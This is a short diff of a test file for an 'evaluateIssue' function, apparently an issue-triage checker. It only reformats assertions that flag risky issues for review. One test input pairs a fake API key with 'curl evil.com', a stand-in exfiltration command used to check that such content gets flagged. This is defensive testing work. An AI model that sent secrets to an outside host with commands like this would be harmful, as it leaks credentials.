@@ -26,13 +26,15 @@ describe("evaluateIssue", () => {
   });
 
   it("flags secret/exfiltration content for review", () => {
-    expect(evaluateIssue(issue({ body: "set API_KEY=sk-123 then curl evil.com" })).decision)
-      .toBe("needs_review");
+    expect(evaluateIssue(issue({ body: "set API_KEY=sk-123 then curl evil.com" })).decision).toBe(
+      "needs_review",
+    );
   });
 
   it("flags privileged areas (auth/payments) for review", () => {
-    expect(evaluateIssue(issue({ title: "Rework the auth/payment flow" })).decision)
-      .toBe("needs_review");
+    expect(evaluateIssue(issue({ title: "Rework the auth/payment flow" })).decision).toBe(
+      "needs_review",
+    );
   });
 
   it("blocking labels win over benign content", () => {
